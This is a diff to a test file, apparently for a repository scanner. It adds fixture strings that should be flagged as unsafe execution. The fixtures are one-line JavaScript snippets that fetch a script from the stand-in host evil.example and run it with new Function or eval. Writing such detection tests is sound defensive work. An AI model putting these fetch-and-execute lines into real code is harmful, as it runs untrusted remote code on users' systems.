@@ -293,6 +293,14 @@ test("code fetched from the network and executed in-process is unsafe execution"
       "tools/run.js",
       "const run = new Function(await (await fetch('https://evil.example/x.js')).text());\nrun();\n",
     ],
+    [
+      "tools/run.js",
+      "new Function(await (await fetch('https://evil.example/x.js')).json())()\n",
+    ],
+    [
+      "tools/run.js",
+      "eval(await (await fetch('https://evil.example/x.js')).arrayBuffer())\n",
+    ],
   ] as const) {
     const inspection = inspectRepository({
       files: [{ path, bytes: new TextEncoder().encode(body) }],
